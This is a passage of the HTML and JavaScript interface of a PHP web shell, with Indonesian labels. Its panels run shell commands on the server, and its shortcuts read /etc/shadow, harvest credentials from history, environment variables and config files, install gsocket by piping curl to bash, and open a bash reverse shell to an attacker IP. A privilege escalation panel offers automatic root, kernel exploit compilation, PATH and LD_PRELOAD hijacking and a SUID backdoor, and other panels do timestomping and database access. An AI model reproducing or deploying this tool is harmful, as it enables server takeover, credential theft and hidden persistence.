                    <label style="font-size: 12px; color: #888; display: flex; align-items: center; cursor: pointer; padding: 8px; background: #1a1a1a; border-radius: 4px; border: 1px solid #333;">
                        <input type="checkbox" id="timestompBulkRecursive" style="margin-right: 8px;">
                        <span>🔁 Recursive (apply to subfolders & files)</span>
                    </label>
                </div>
            </div>
            
            <div id="timestompBulkProgress" style="display: none; margin-bottom: 15px; padding: 10px; background: #111; border: 1px solid #333; border-radius: 4px;">
                <div style="font-size: 11px; color: #888; margin-bottom: 5px;">
                    Progress: <span id="timestompBulkCurrent" style="color: #f80; font-weight: bold;">0</span> / <span id="timestompBulkTotal">0</span>
                </div>
                <div style="height: 6px; background: #333; border-radius: 3px; overflow: hidden;">
                    <div id="timestompBulkProgressBar" style="height: 100%; background: linear-gradient(90deg, #f80, #f44); width: 0%; transition: width 0.3s;"></div>
                </div>
                <div id="timestompBulkStatus" style="font-size: 11px; color: #f80; margin-top: 5px;">Initializing...</div>
            </div>
            
            <div id="timestompBulkResults" style="display: none; max-height: 50vh; overflow-y: auto; font-size: 12px; font-family: monospace; background: #000; padding: 10px; border: 1px solid #333; border-radius: 4px;"></div>
        </div>
        <div class="modal-footer" style="flex-shrink: 0; border-top: 1px solid #333; padding: 10px 15px;">
            <button id="timestompBulkExecuteBtn" onclick="executeTimestompBulk()" style="background: #ff5722; color: #fff; font-weight: bold; padding: 8px 20px;">⏰ Execute Timestomp</button>
            <button type="button" onclick="closeModal('timestompBulkModal')" id="timestompBulkCloseBtn" style="padding: 8px 20px;">Cancel</button>
        </div>
    </div>
</div>

<div class="modal" id="serverInfoModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>🖥️ Server Information</h3>
            <button onclick="copyToClipboard('serverInfoContent')">📋 Copy</button>
        </div>
        <div class="modal-body">
            <div id="serverInfoContent">Server information will be loaded here...</div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('serverInfoModal')">Close</button>
        </div>
    </div>
</div>
<div class="modal" id="shellModal">
    <div class="modal-content modal-wide">
        <div class="modal-header">
            <h3>💻 Shell Command</h3>
        </div>
        <div class="shell-container">
            <div class="shell-left">
                <form id="shellForm">
                    <input type="text" name="cmd" id="shellCmdInput" placeholder="Type shell command...">
                    <button type="submit">⚡ Execute</button>
                </form>
                <div class="shell-shortcuts">
                    <strong>🎯 Enumeration & Privilege Escalation</strong>
                    <div class="shortcut-list">
                        <div class="shortcut-item" onclick="setShellCommand('whoami && id && groups')">
                            <code>whoami && id</code>
                            <span class="shortcut-desc"><strong>[IDENTITY]</strong> Menampilkan user saat ini, UID, GID, dan grup. Dapat menemukan: grup spesial (sudo, docker, adm), multiple identities, privilege level.</span>
                        </div>
                        <div class="shortcut-item" onclick="setShellCommand('uname -a && cat /proc/version')">
                            <code>uname -a</code>
                            <span class="shortcut-desc"><strong>[KERNEL INFO]</strong> Kernel version, architecture, hostname. Gunanya: Cari kernel exploit spesifik (CVE), determine OS type untuk payload yang tepat.</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("cat /etc/passwd | grep -E \"/bin/bash|/bin/sh\"")'>
                            <code>cat /etc/passwd</code>
                            <span class='shortcut-desc'><strong>[USER LIST]</strong> Semua user dengan shell aktif. Dapat: username target, home directories, service accounts, potensi lateral movement targets.</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("cat /etc/shadow 2>/dev/null || echo \"Access Denied - Try privilege escalation first\"")'>
                            <code>cat /etc/shadow</code>
                            <span class='shortcut-desc'><strong>[PASSWORD HASH]</strong> File hash password (requires root). Jika berhasil: Crack password dengan john/hashcat, lateral movement, persistence.</span>
                        </div>
                        <div class="shortcut-item" onclick="setShellCommand('sudo -l 2>/dev/null')">
                            <code>sudo -l</code>
                            <span class="shortcut-desc"><strong>[SUDO RIGHTS]</strong> Command apa saja yang bisa dijalankan sebagai root tanpa password. HIGH VALUE: sudo su, sudo /bin/bash, sudo vim = INSTANT ROOT!</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("netstat -tulnp 2>/dev/null || ss -tulnp")'>
                            <code>netstat -tulnp</code>
                            <span class='shortcut-desc'><strong>[NETWORK SERVICES]</strong> Port listening, established connections, PID/process. Gunanya: Hidden services (localhost only), database ports, pivot opportunities, port forwarding targets.</span>
                        </div>
                        <div class="shortcut-item" onclick="setShellCommand('ip a && ip r && cat /etc/resolv.conf')">
                            <code>ip a && ip r</code>
                            <span class="shortcut-desc"><strong>[NETWORK CONFIG]</strong> IP addresses, interfaces, routing, DNS. Dapat: Network segments untuk pivoting, dual-homed systems, internal DNS untuk AD enumeration.</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("ps aux -sort=-%cpu | head -20")'>
                            <code>ps aux</code>
                            <span class='shortcut-desc'><strong>[RUNNING PROCESSES]</strong> Semua process dengan user & command line. Dapat: Credentials di command line (DB password, API keys), cron processes, custom applications.</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null")'>
                            <code>find SUID</code>
                            <span class='shortcut-desc'><strong>[PRIVESC: SUID]</strong> File dengan SUID bit (jalan sebagai owner). EXPLOIT: nmap, vim, less, man, more, find, bash, nano = ROOT SHELL via GTFOBins!</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("getcap -r / 2>/dev/null | grep -v \"^/proc\"")'>
                            <code>getcap -r /</code>
                            <span class='shortcut-desc'><strong>[PRIVESC: CAPABILITIES]</strong> Linux capabilities (alternatif SUID). EXPLOIT: cap_setuid+ep pada python, perl, php = UID 0 manipulation!</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("find /etc/cron* -type f -perm -o+r 2>/dev/null | xargs cat 2>/dev/null")'>
                            <code>cat /etc/cron*</code>
                            <span class='shortcut-desc'><strong>[PERSISTENCE/PRIVESC]</strong> System-wide cron jobs. Dapat: Writable scripts yang dijalankan root, PATH manipulation opportunities, scheduled tasks untuk injection.</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("find / -writable -type f -not -path \"/proc/*\" -not -path \"/sys/*\" 2>/dev/null | head -30")'>
                            <code>find writable</code>
                            <span class='shortcut-desc'><strong>[WRITABLE FILES]</strong> File yang bisa dimodifikasi current user. Gunanya: Backdoor binaries, modify scripts, DLL hijacking opportunities.</span>
                        </div>
                        <div class="shortcut-item" onclick="setShellCommand('ls -la /root/ 2>/dev/null; ls -la /home/*/.ssh/ 2>/dev/null')">
                            <code>ls /root & .ssh</code>
                            <span class="shortcut-desc"><strong>[ACCESS CHECK]</strong> Cek akses ke /root dan SSH keys. Jika akses: Golden ticket (id_rsa), persistence via authorized_keys, lateral movement.</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("cat ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.viminfo 2>/dev/null | head -50")'>
                            <code>bash_history</code>
                            <span class='shortcut-desc'><strong>[CREDENTIAL HARVEST]</strong> Command history. Dapat: Password di plain text (mysql -p), sudo usage patterns, internal IP addresses, file locations sensitif.</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("env | grep -i \"pass\|key\|token\|secret\|cred\"")'>
                            <code>env | grep pass</code>
                            <span class='shortcut-desc'><strong>[ENV VARIABLES]</strong> Environment variables. Sering ada: 🗄️ Database</span>
                        </div>
                        <div class='shortcut-item' onclick='setShellCommand("find /home -name \".env\" -o -name \"config.php\" -o -name \"wp-config.php\" -o -name \"settings.py\" 2>/dev/null | head -10")'>
                            <code>find config files</code>
                            <span class='shortcut-desc'><strong>[CONFIG HUNTING]</strong> Cari file konfigurasi aplikasi. Isinya: DB credentials, API secrets, encryption keys, cloud service configs.</span>
                        </div>
                        <div class="shortcut-item" onclick="setShellCommand('cat /etc/os-release && lsb_release -a 2>/dev/null')">
                            <code>os-release</code>
                            <span class="shortcut-desc"><strong>[OS VERSION]</strong> Detail distro & version. Gunanya: Cari exploit spesifik OS, determine package manager (apt/yum), compatibility checks.</span>
                        </div>
                        <div class="shortcut-item" onclick="setShellCommand('which python python3 perl ruby nc nc.traditional ncat python2 2>/dev/null')">
                            <code>which interpreters</code>
                            <span class="shortcut-desc"><strong>[AVAILABLE TOOLS]</strong> Cek binary untuk reverse shell/payload. Python = pty upgrade, nc = netcat listener, perl/ruby = alternative payload.</span>
                        </div>
                        <div class="shortcut-item" onclick="setShellCommand('ls -la /var/www/html /opt /srv /var/lib 2>/dev/null')">
                            <code>ls web dirs</code>
                            <span class="shortcut-desc"><strong>[WEB ENUM]</strong> Cek direktori web server. Dapat: Source code aplikasi, upload directories, database configs, log files.</span>
                        </div>
                        <div class="shortcut-divider"></div>
                        <div class="shortcut-item" onclick='setShellCommand("bash -c \"$(curl -fsSL https://gsocket.io/y)\"")'>
                            <code>Install Gsocket</code>
                            <span class="shortcut-desc"><strong>[PERSISTENCE TOOL]</strong> Install gsocket - Global Socket untuk reverse shell yang melewati firewall/NAT tanpa port forwarding.</span>
                        </div>
                        <div class="shortcut-item" onclick='setShellCommand("GS_UNDO=1 bash -c \"$(curl -fsSL https://gsocket.io/y)\"")'>
                            <code>Undo Gsocket</code>
                            <span class="shortcut-desc"><strong>[CLEANUP]</strong> Menghapus gsocket dari sistem - Bersihkan jejak setelah testing selesai.</span>
                        </div>
                        <div class="shortcut-divider"></div>
                        <div class='shortcut-item' onclick='setShellCommand("bash -i >& /dev/tcp/__IP__/443 0>&1")'>
                            <code>Reverse Shell Bash</code>
                            <span class='shortcut-desc'><strong>[REVERSE SHELL]</strong> Classic bash reverse shell. Ganti __IP__ dengan IP attacker Anda. Jalankan netcat listener: nc -lvnp 443</span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="shell-right">
                <div class="shell-output-header">
                    <strong>💻 Output:</strong>
                    <button onclick="copyToClipboard('shellOutput')" style="padding: 4px 10px; font-size: 11px;"> Copy</button>
                </div>
                <pre id="shellOutput">Output will appear here...</pre>
            </div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('shellModal')">Close</button>
        </div>
    </div>
</div>
<div class="modal" id="searchResultsModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>Search Results</h3>
            <button onclick="copyToClipboard('searchResultsContent')">Copy</button>
        </div>
        <div class="modal-body">
            <div id="searchResultsContent">Results will appear here...</div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('searchResultsModal')">Close</button>
        </div>
    </div>
</div>
<div class="modal" id="websiteDiscoverModal">
    <div class="modal-content modal-discover">
        <div class="modal-header">
            <h3 title="Discover all websites on this server">🌐 Website Discovery</h3>
        </div>
        <div class="discover-container">
            <div class="discover-sidebar">
                <h4 style="margin:0 0 15px 0;color:#6cf;font-size:13px;">⚡ Konfigurasi Scan</h4>
                <div style="margin-bottom:15px;">
                    <label style="font-size:11px;color:#888;display:block;margin-bottom:8px;">🔍 Mode Pencarian:</label>
                    <div class="search-type-selector">
                        <div class="search-type active" data-type="filename" onclick="selectSearchType('filename')">
                            📄 Nama File
                        </div>
                        <div class="search-type" data-type="content" onclick="selectSearchType('content')">
                            📝 Konten File
                        </div>
                    </div>
                </div>
                <div style="margin-bottom:15px;">
                    <label style="font-size:11px;color:#888;display:block;margin-bottom:5px;">
                        📋 Pattern (pisah dengan koma):
                    </label>
                    <textarea id="searchPattern" rows="3" placeholder="index.php, index.html, .htaccess" style="font-size:11px;width:100%;resize:vertical;">index.php, index.html, .htaccess</textarea>
                    <p id="patternHint" style="font-size:10px;color:#666;margin:5px 0 0 0;">
                        Contoh: *.php, config.*, wp-config.php
                    </p>
                </div>
                <div style="margin-bottom:15px;">
                    <label style="font-size:11px;color:#888;display:block;margin-bottom:8px;">📊 Kedalaman Scan:</label>
                    <div class="scan-modes">
                        <div class="scan-mode" data-mode="quick" onclick="selectScanMode('quick')">
                            <strong>⚡ Quick</strong>
                            <span class="scan-desc">1-2 level, ~30 detik</span>
                        </div>
                        <div class="scan-mode active" data-mode="standard" onclick="selectScanMode('standard')">
                            <strong>📊 Standard</strong>
                            <span class="scan-desc">3-4 level, ~2 menit</span>
                        </div>
                        <div class="scan-mode" data-mode="deep" onclick="selectScanMode('deep')">
                            <strong>🎯 Deep</strong>
                            <span class="scan-desc">5-6 level, ~5 menit</span>
                        </div>
                        <div class="scan-mode" data-mode="brutal" onclick="selectScanMode('brutal')">
                            <strong> ' Brutal</strong>
                            <span class="scan-desc">8+ level, >10 menit</span>
                        </div>
                    </div>
                </div>
                <div style="margin-bottom:15px;padding:10px;background:#222;border-radius:4px;">
                    <label style="font-size:11px;color:#888;display:flex;align-items:center;cursor:pointer;">
                        <input type="checkbox" id="extractTitle" checked style="margin-right:8px;">
                        📝 Extract &lt;title&gt; dari index
                    </label>
                    <label style="font-size:11px;color:#888;display:flex;align-items:center;cursor:pointer;margin-top:8px;">
                        <input type="checkbox" id="showPreview" style="margin-right:8px;">
                        👁️ Tampilkan preview konten (mode konten)
                    </label>
                </div>
                <button id="startScanBtn" onclick="startWebsiteScan()" style="width:100%;padding:12px;background:#0f0;color:#111;font-weight:bold;font-size:14px;">
                    🚀 Mulai Scan
                </button>
                
                <div style="margin-top:15px;padding:12px;background:#2a1f1a;border:1px solid #f80;border-radius:4px;">
                    <h4 style="margin:0 0 10px 0;color:#f80;font-size:12px;">🌐 VirtualHost Scanner</h4>
                    <p style="font-size:10px;color:#888;margin:0 0 10px 0;">
                        Temukan domain & document root dari konfigurasi Apache/Nginx
                    </p>
                    <div style="display:flex;gap:5px;margin-bottom:8px;">
                        <button onclick="scanVirtualHosts('apache')" style="flex:1;padding:8px;background:#f80;color:#111;font-size:11px;font-weight:bold;">
                            🔍 Apache
                        </button>
                        <button onclick="scanVirtualHosts('nginx')" style="flex:1;padding:8px;background:#0f0;color:#111;font-size:11px;font-weight:bold;">
                            🔍 Nginx
                        </button>
                    </div>
                    <div style="display:flex;gap:5px;margin-bottom:8px;">
                        <button onclick="scanVirtualHosts('litespeed')" style="flex:1;padding:8px;background:#f0f;color:#111;font-size:11px;font-weight:bold;">
                            🔍 LiteSpeed
                        </button>
                        <button onclick="scanVirtualHosts('all')" style="flex:1;padding:8px;background:#6cf;color:#111;font-size:11px;font-weight:bold;">
                            🔍 All Servers
                        </button>
                    </div>
                </div>
                
                <div id="scanStats" style="margin-top:15px;padding:10px;background:#1a1a1a;border-radius:4px;font-size:11px;color:#888;display:none;">
                    <div>⏰ Waktu: <span id="scanTime">0s</span></div>
                    <div>🔍 Ditemukan: <span id="scanCount">0</span></div>
                    <div>📊 Status: <span id="scanStatus">Menunggu...</span></div>
                </div>
            </div>
            <div class="discover-main">
                <div id="websiteDiscoverContent" class="discover-content">
                    <div class="discover-placeholder">
                        <span style="font-size:50px;">'</span>
                        <h3 style="color:#6cf;margin:15px 0;">🌐 Website Discovery</h3>
                        <p style="color:#888;">Konfigurasi pencarian di panel kiri, lalu klik "Mulai Scan"</p>
                        <div style="margin-top:20px;text-align:left;padding:15px;background:#1a1a1a;border-radius:6px;font-size:11px;">
                            <p style="color:#6cf;margin-bottom:10px;"><strong> Tips Penggunaan:</strong></p>
                            <p style="color:#888;margin:5px 0;"><strong>📄 Mode Nama File:</strong></p>
                            <p style="color:#666;margin:3px 0;padding-left:10px;">• index.php, index.html, .htaccess</p>
                            <p style="color:#666;margin:3px 0;padding-left:10px;">• wp-config.php, configuration.php</p>
                            <p style="color:#666;margin:3px 0;padding-left:10px;">• *.php, config.* (wildcard)</p>
                            <p style="color:#888;margin:10px 0 5px 0;"><strong>🎉 Mode Konten:</strong></p>
                            <p style="color:#666;margin:3px 0;padding-left:10px;">• DB_PASSWORD, username, password</p>
                            <p style="color:#666;margin:3px 0;padding-left:10px;">• API_KEY, SECRET_KEY, token</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('websiteDiscoverModal')">Close</button>
        </div>
    </div>
</div>
<div class="modal" id="dbExploreModal">
    <div class="modal-content" style="max-width: 900px;">
        <div class="modal-header">
            <h3 title="Auto-detected WordPress database configurations">- 🅿️ WordPress 🗄️ Database</h3>
        </div>
        <div class="modal-body">
            <div id="dbExploreContent">
                <p>Searching for wp-config.php files...</p>
            </div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('dbExploreModal')">Close</button>
        </div>
    </div>
</div>
<div class="modal" id="dbConnectModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 title="Manual database connection">🗄️ Database</h3>
        </div>
        <div class="modal-body">
            <form id="dbConnectForm">
                <label style="font-size:12px;color:#888;">Hostname:</label>
                <input type="text" name="db_host" id="dbHost" placeholder="localhost" value="localhost">
                <label style="font-size:12px;color:#888;">Port:</label>
                <input type="number" name="db_port" id="dbPort" placeholder="3306" value="3306">
                <label style="font-size:12px;color:#888;">🗄️ Database</label>
                <input type="text" name="db_name" id="dbName" placeholder="database_name">
                <label style="font-size:12px;color:#888;">Username:</label>
                <input type="text" name="db_user" id="dbUser" placeholder="root">
                <label style="font-size:12px;color:#888;">Password:</label>
                <input type="text" name="db_pass" id="dbPass" placeholder="password">
            </form>
            <div id="dbConnectStatus" style="margin-top:10px;padding:10px;background:#1a1a1a;border-radius:4px;display:none;"></div>
        </div>
        <div class="modal-footer">
            <button onclick="testDbConnection()">Test Connection</button>
            <button onclick="connectToDatabase()">Connect & Manage</button>
            <button onclick="closeModal('dbConnectModal')">Close</button>
        </div>
    </div>
</div>
<div class="modal" id="dbManagerModal">
    <div class="modal-content modal-fullscreen">
        <div class="modal-header">
            <h3 title="🗄️ Database Manager">🗄️ Database Manager</h3>
            <div id="dbConnectionInfo" style="font-size:11px;color:#888;"></div>
        </div>
        <div class="modal-body db-manager-body">
            <div class="db-sidebar">
                <h4 style="margin:0 0 10px 0;font-size:13px;color:#6cf;">📋 Tables</h4>
                <div id="dbTablesList"><p>⏳ Loading tables...</p>
                </div>
            </div>
            <div class="db-main-content">
                <div class="db-query-section">
                    <label style="font-size:12px;color:#888;display:block;margin-bottom:5px;">📄 SQL Query:</label>
                    <div class="db-query-input">
                        <textarea id="sqlQuery" placeholder="SELECT * FROM table_name LIMIT 10;" style="font-family: monospace; font-size: 13px;"></textarea>
                        <div class="db-query-buttons">
                            <button onclick="executeSqlQuery()" style="background:#0f0;color:#111;font-weight:bold;">⚡ Execute</button>
                            <button onclick="clearSqlResult()">🗑️ Clear</button>
                        </div>
                    </div>
                </div>
                <div class="db-result-section">
                    <div id="sqlResult">
                        <p style="color: #666;">Execute a query to see results...</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('dbManagerModal')">Close</button>
        </div>
    </div>
</div>

<!-- 🔥 Privilege Escalation Modal -->
<div class="modal" id="privescModal">
    <div class="modal-content" style="max-width: 900px; width: 90vw; max-height: 85vh;">
        <div class="modal-header" style="padding: 10px 15px;">
            <h3 style="margin:0;">💀 Privilege Escalation</h3>
            <button onclick="closeModal('privescModal')" style="padding: 4px 12px;">✕</button>
        </div>
        <div style="padding: 10px 15px;">
            <!-- Action Buttons Row -->
            <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;">
                <button id="getRootBtn" onclick="autoGetRoot()" style="flex:2;min-width:150px;background:linear-gradient(135deg,#f44,#f80);color:#fff;font-weight:bold;padding:10px;font-size:14px;border:none;border-radius:4px;cursor:pointer;">🔥 GET ROOT (AUTO)</button>
                <button onclick="scanPrivesc()" style="flex:1;min-width:80px;background:#0f0;color:#111;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🔍 Scan</button>
                <button onclick="installPersistence()" style="flex:1;min-width:80px;background:#f80;color:#111;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🔒 Persist</button>
                <button onclick="scanOtherShells()" style="flex:1;min-width:100px;background:#f44;color:#fff;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🕵️ Shells</button>
            </div>
            
            <!-- Advanced Attack Buttons -->
            <div style="display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap;">
                <button onclick="kernelAutoCompile()" style="flex:1;min-width:120px;background:#80f;color:#fff;font-weight:bold;padding:6px;font-size:11px;border:none;border-radius:4px;cursor:pointer;">🐛 Kernel Auto-Compile</button>
                <button onclick="hijackPathAttack()" style="flex:1;min-width:120px;background:#f0f;color:#fff;font-weight:bold;padding:6px;font-size:11px;border:none;border-radius:4px;cursor:pointer;">🛤️ PATH Hijack</button>
                <button onclick="ldPreloadAttack()" style="flex:1;min-width:120px;background:#0af;color:#fff;font-weight:bold;padding:6px;font-size:11px;border:none;border-radius:4px;cursor:pointer;">🔧 LD_PRELOAD</button>
                <button onclick="sudoTokenAttack()" style="flex:1;min-width:120px;background:#fa0;color:#111;font-weight:bold;padding:6px;font-size:11px;border:none;border-radius:4px;cursor:pointer;">🔐 Sudo Token</button>
            </div>
            
            <!-- Status Bar -->
            <div id="privescStatus" style="display:none;margin-bottom:10px;padding:8px;background:#1a1a1a;border:1px solid #333;border-radius:4px;font-size:12px;"></div>
            
            <!-- Stats Row -->
            <div style="display:flex;gap:15px;margin-bottom:10px;padding:8px;background:#111;border-radius:4px;font-size:11px;color:#888;">
                <span>🐛 <span id="statKernel">-</span></span>
                <span>⚡ SUID: <span id="statSuid">0</span></span>
                <span>🔑 Sudo: <span id="statSudo">No</span></span>
                <span>🐳 Docker: <span id="statDocker">No</span></span>
            </div>
            
            <!-- Results Area -->
            <div id="privescResults" style="display:none;max-height:150px;overflow-y:auto;background:#0a0a0a;border:1px solid #0f0;border-radius:4px;padding:8px;margin-bottom:8px;font-size:11px;">
            </div>
            
            <!-- Output Log (Main display area) -->
            <div id="privescOutput" style="height:200px;overflow-y:auto;background:#000;border:1px solid #333;border-radius:4px;padding:8px;font-family:monospace;font-size:11px;white-space:pre-wrap;">
                <div style="text-align:center;padding:20px;color:#666;">
                    <span style="font-size:20px;">💀</span>
                    <p style="margin:5px 0;font-size:11px;">Click 🔥 GET ROOT (AUTO) to start</p>
                </div>
            </div>
            
            <!-- 🎯 INTERACTIVE ROOT TERMINAL - Muncul setelah root berhasil -->
            <div id="rootTerminal" style="display:none;margin-top:10px;border:2px solid #0f0;border-radius:4px;background:#000;">
                <div style="background:linear-gradient(135deg,#0f0,#0a0);color:#000;padding:6px 10px;font-weight:bold;font-size:12px;display:flex;justify-content:space-between;align-items:center;">
                    <span>🎉 INTERACTIVE ROOT TERMINAL</span>
                    <span style="font-size:10px;background:#000;color:#0f0;padding:2px 6px;border-radius:2px;">uid=0(root)</span>
                </div>
                <div id="rootTerminalOutput" style="height:150px;overflow-y:auto;background:#000;padding:8px;font-family:monospace;font-size:11px;color:#0f0;white-space:pre-wrap;">
                    <span style="color:#888;"># Root terminal ready. Type command below:</span>
                </div>
                <div style="display:flex;padding:8px;background:#111;border-top:1px solid #333;">
                    <span style="color:#0f0;font-family:monospace;font-size:12px;padding:6px 8px;background:#000;border-radius:3px 0 0 3px;border:1px solid #0f0;border-right:none;">root@server#</span>
                    <input type="text" id="rootTerminalInput" placeholder="Enter command..." style="flex:1;background:#000;color:#0f0;border:1px solid #0f0;border-left:none;padding:6px;font-family:monospace;font-size:12px;outline:none;" onkeypress="if(event.key==='Enter')executeRootCommand()">
                    <button onclick="executeRootCommand()" style="background:#0f0;color:#000;border:none;padding:6px 15px;font-weight:bold;cursor:pointer;margin-left:5px;border-radius:0 3px 3px 0;">Execute</button>
                </div>
                <div style="padding:6px 10px;background:#1a1a1a;font-size:10px;color:#888;">
                    <span id="rootTerminalStatus" style="color:#f80;font-weight:bold;">⚠️ STEP 1: Click 🔒 Persist button above to install SUID backdoor</span>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
document.addEventListener('keydown', function(e) { if (e.key === 'Escape') { document.querySelectorAll('.modal').forEach(modal => modal.classList.remove('active')); } });
function openModal(id) { document.getElementById(id).classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); }
function copyToClipboard(elementId) {
    const element = document.getElementById(elementId);
    const textToCopy = element.value || element.innerText;
    navigator.clipboard.writeText(textToCopy).then(() => {
        alert('✅ Berhasil dicopy ke clipboard!');
    }).catch(err => {
        // Fallback for older browsers
        element.select();
        document.execCommand('copy');
        alert('✅ Berhasil dicopy ke clipboard!');
    });
}

// Check if root - removed as redundant with autoGetRoot

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}
function setShellCommand(cmd) {
    document.getElementById('shellCmdInput').value = cmd;
}
function loadAndShowServerInfo() {
    const modal = document.getElementById('serverInfoModal');
    const contentDiv = document.getElementById('serverInfoContent');
    openModal('serverInfoModal');
    contentDiv.innerHTML = '⏳ Loading server information, please wait...';
    const url = '?masuk=<?php echo AL_SHELL_KEY ?>&action=get_server_info';
    fetch(url)
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.text();
        })
        .then(html => {
            contentDiv.innerHTML = html;
        })
        .catch(error => {
            contentDiv.innerHTML = 'Failed to load server information: ' + error.message;
        });
}
function viewFileAsync(fileName) {
    const modal = document.getElementById('viewModal');
    const title = document.getElementById('viewTitle');
    const content = document.getElementById('viewContent');
    title.textContent = 'View: ' + fileName;
    content.textContent = '⏳ Loading...';
    openModal('viewModal');
    fetch('?masuk=<?php echo AL_SHELL_KEY ?>&d=<?php echo urlencode($dir) ?>&action=view_file&file=' + encodeURIComponent(fileName))
        .then(response => response.json())
        .then(data => { content.textContent = data.content; })
        .catch(error => { content.textContent = 'Error loading file: ' + error; });
}
function openEditModal(fileName) {
    const modal = document.getElementById('editModal');
    document.getElementById('editTitle').textContent = 'Edit: ' + fileName;
    document.getElementById('editFile').value = fileName;
    document.getElementById('editContent').value = '⏳ Loading...';
    openModal('editModal');
    fetch('?masuk=<?php echo AL_SHELL_KEY ?>&d=<?php echo urlencode($dir) ?>&action=view_file&file=' + encodeURIComponent(fileName))
        .then(response => response.json())
        .then(data => { document.getElementById('editContent').value = data.content; });
}
function openRenameModal(fileName) {
    document.getElementById('renameTitle').textContent = 'Rename: ' + fileName;
    document.getElementById('renameTarget').value = fileName;
    document.querySelector('#renameModal input[name="new_name"]').value = fileName;
    openModal('renameModal');
}
function openChmodModal(fileName) {
    document.getElementById('chmodTitle').textContent = 'Change Permissions: ' + fileName;
    document.getElementById('chmodTarget').value = fileName;
    document.getElementById('customPermInput').value = '';
    document.getElementById('customPermDiv').style.display = 'none';
    document.getElementById('chmodPermSelect').value = '755';
    openModal('chmodModal');
}
function openDeleteModal(fileName) {
    document.getElementById('deleteMessage').textContent = `Are you sure you want to delete "${fileName}"?`;
    document.getElementById('deleteTarget').value = fileName;
    openModal('confirmDeleteModal');
}
function goToDefaultDirectory() {
    window.location.href = '?masuk=<?php echo AL_SHELL_KEY ?>&d=<?php echo urlencode($default_dir) ?>';
}
document.getElementById('searchForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const modal = document.getElementById('searchResultsModal');
    const contentDiv = document.getElementById('searchResultsContent');
    openModal('searchResultsModal');
    contentDiv.innerHTML = 'Searching, please wait...';
    const formData = new FormData(this);
    formData.append('action', 'perform_search');
    formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
    formData.append('d', '<?php echo htmlspecialchars($dir) ?>');
    fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=perform_search', {
        method: 'POST',
        body: formData
    })
        .then(response => response.text())
        .then(html => {
            contentDiv.innerHTML = html;
        })
        .catch(error => {
            contentDiv.innerHTML = 'Search failed: ' + error.message;
        });
});
document.getElementById('shellForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const output = document.getElementById('shellOutput');
    output.textContent = '- Executing...';
    const formData = new FormData(this);
    formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
    formData.append('d', '<?php echo htmlspecialchars($dir) ?>');
    fetch('', { method: 'POST', body: formData })
        .then(response => response.text())
        .then(html => {
            console.log('Shell response received, length:', html.length);
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const newOutput = doc.querySelector('.output');
            if (newOutput) {
                console.log('Output element found:', newOutput.innerText.substring(0, 100));
                output.textContent = newOutput.innerText.trim();
            } else {
                console.log('Output element NOT found in response');
                output.textContent = 'No output returned. (Response: ' + html.substring(0, 200) + '...)';
            }
        })
        .catch(error => {
            console.error('Shell error:', error);
            output.textContent = 'Error executing command: ' + error;
        });
});
document.getElementById('chmodForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData(this);
    const permSelect = document.getElementById('chmodPermSelect');
    const customInput = document.getElementById('customPermInput');
    if (permSelect.value === 'custom') {
        if (customInput.value.trim() === '') {
            alert('Please enter a custom permission value.');
            return;
        }
        formData.set('chmod_perm', customInput.value);
    }
    fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
});
document.getElementById('chmodPermSelect').addEventListener('change', function() {
    const customDiv = document.getElementById('customPermDiv');
    if (this.value === 'custom') {
        customDiv.style.display = 'block';
    } else {
        customDiv.style.display = 'none';
    }
});
document.getElementById('navigateForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData(this);
    formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
    fetch('', { method: 'POST', body: formData })
        .then(response => {
            if (response.redirected) {
                window.location.href = response.url;
            } else {
                return response.text();
            }
        })
        .then(html => {
            if (html) {
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                const newOutput = doc.querySelector('.output');
                if (newOutput && newOutput.innerText.trim()) {
                    alert(newOutput.innerText.trim());
                }
            }
        })
        .catch(error => {
